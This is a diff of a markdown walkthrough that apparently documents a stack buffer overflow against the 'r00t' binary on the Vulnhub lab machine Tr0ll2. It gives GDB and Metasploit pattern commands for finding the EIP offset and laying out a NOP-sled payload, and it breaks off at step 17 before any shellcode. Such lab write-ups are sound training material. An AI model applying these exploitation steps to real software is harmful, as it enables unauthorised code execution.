@@ -1,10 +1,37 @@
 ## How to do bufferoverflow for a Linux binary in GDB () ?
-### Tested for Trollv2 Vulnhub - Dated 22 
+### Tested for Trollv2 Vulnhub - Dated 22 Dec 2020
 
 
-1. Identify the overflow by giving some malicious input to binary; should see something like "SEGMENTATION FAULT" etc. 
-2. Python can help in generating * no of characters e.g. python -c 'print("A"*500)' can generate 500 A's.
-3. Open the binary name in GDB by running command: gdb <binary>
-4. Next inside the GBD type command: r $(python -c 'print"A"*300') 
-5. Above command should crash the program, and GBD will show "Program received signal SIGSEGV, Segmentation fault." 
-6. Create a unique pattern with MSF by using command: msf-pattern_create -l 300
+01. Identify the overflow by giving some malicious input to binary; should see something like "SEGMENTATION FAULT" etc. 
+
+02. Python can help in generating * no of characters e.g. python -c 'print("A"*500)' can generate 500 A's.
+
+03. Open the binary name in GDB by running command: gdb <binary>
+
+04. Next inside the GBD type command: r $(python -c 'print"A"*300') 
+
+05. Above command should crash the program, and GBD will show "Program received signal SIGSEGV, Segmentation fault." 
+
+06. Create a unique pattern with MSF by using command: msf-pattern_create -l 300
+
+07. Copy that unique pattern and again in gdb type: r <MSF generated unique pattern>
+
+08. Above command will again crash the program, type command: info registers and note down the value of EIP. Lets assume EIP value is 0x6a413969.
+
+09. Again use MSF to find the exact offset point by running command: msf-pattern_offset -q 6a413969. The output would be some number e.g. 268.
+
+10. To check we have control of EIP, type following command inside the GDB: $(python -c 'print "A"*268 + "B"*4'). And we should see EIP being filled with BBBB or 42 42 42 42.
+
+11. Exit GDB and re-open it with following command: env - gdb r00t
+
+12. Inside GBD type command: show env, it will show output something e.g. LINES=27 COLUMNS=120.
+
+13. Type command: unset env LINES
+
+14. Type command: unset env COLUMNS
+
+15. Type command: $(python -c 'print "A"*268 + "BBBB" + "\x90"*16 + "C"*100')
+
+16. No need to notedown the JMP address, simply notedown the value of ESP which in this case is 0xbffffce0
+
+17. 
